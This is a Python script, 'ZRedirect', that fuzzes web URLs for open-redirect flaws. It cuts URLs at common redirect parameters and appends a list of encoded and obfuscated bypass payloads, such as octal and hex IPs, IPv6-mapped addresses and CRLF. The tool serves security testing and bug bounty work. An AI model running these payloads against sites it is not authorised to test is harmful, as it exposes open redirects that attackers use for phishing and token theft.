import requests, os, sys, argparse, optparse

#multiprocessing
print("""\033[2;31m
  _____  ____          _ _               _   
 |__  / |  _ \ ___  __| (_)_ __ ___  ___| |_ 
   / /  | |_) / _ \/ _` | | '__/ _ \/ __| __|
  / /_  |  _ <  __/ (_| | | | |  __/ (__| |_ 
 /____| |_| \_\___|\__,_|_|_|  \___|\___|\__|
                                                                                        

| ZRedirect |
| @electronicbots |

\033[1;m""")

paramL = ['?url=','?next=','?target=','?rurl=','?dest=','?destination=','?redir=','?redirect_uri=','?redirect_url=','?redirect=','/redirect/','/cgi-bin/redirect.cgi?', '/out/', '/out?','?view=','/login?to=','?image_url=','?go=','?return=','?returnTo=', '?return_to=','?checkout_url=','?continue=','?return_path=','?newurl=','?path=']
newurls = []
payloads = ['http://www.google.com','/%09/google.com','/%5cgoogle.com', 'https://google%252ecom','https://google.com%E3%80%82.com', '//www.google.com/%2f%2e%2e', '//www.google.com/%2e%2e','//google.com/','//google.com/%2f..', '//\google.com', '/\victim.com:80%40google.com', '//google.com//%2F%2E%2', 'http://[::ffff:216.58.214.206', 'http:[::ffff:216.58.214.206', 'http://00330.00072.0000326.0000031', 'http:00330.00072.0000326.0000031', 'http://00330.0x3a.5499', 'http:00330.0x3a.5499', 'http://00330.385607', 'http:00330.385607', 'http://0330.072.0326.031', 'http:0330.072.0326.031', 'http:%0a%0dgoogle.co', 'http://0xd8.072.5499', 'http:0xd8.072.5499', 'http://0xd8.0x3a.0xd6.0xc', 'http:0xd8.0x3a.0xd6.0xc', 'http://0xd8.385607', 'http:0xd8.385607', 'http://0xACD90CCE', 'http://[::216.58.214.206', 'http:[::216.58.214.206']
def Args():

    Parser = optparse.OptionParser()
    group = optparse.OptionGroup(Parser, "Grouped arguments")
    group.add_option('--target' , dest='filepath', help = 'Path to the urls file')
    Parser.add_option_group(group)
    (arguments, values) = Parser.parse_args()
    return arguments

def final(filepath):
   with open(filepath, 'r') as urls:
      for url in urls.read().splitlines():
         for param in paramL:
            if param in url:
               Splitted = url.rsplit(param,1)[0]
               newurls.append(Splitted+param)



def fuzz(filename):
   for i in range(len(newurls)):
      for o in range(len(payloads)):
         try:
            x = requests.get(newurls[i] + payloads[o], allow_redirects = False)
            if x.status_code == 301 or x.status_code == 302:
               print("\033[1;31m" + x.url + "\033[1;m\033[1;32m [+] Redirection Worked")
            else:
               print('\033[1;36m'+x.url+'\033[1;m'+'\033[1;31m [-]No Redirection\033[1;m')
         except IOError:
            print('\033[1;33m['+IOError+'\033[1;m')



def main():
    arguments = Args()
    if '--target' in str(sys.argv):
        a = final(arguments.filepath)
        fuzz(a)
    else:
        print("Try ./ZRedirect.py --help")


if __name__ == '__main__':
    main()
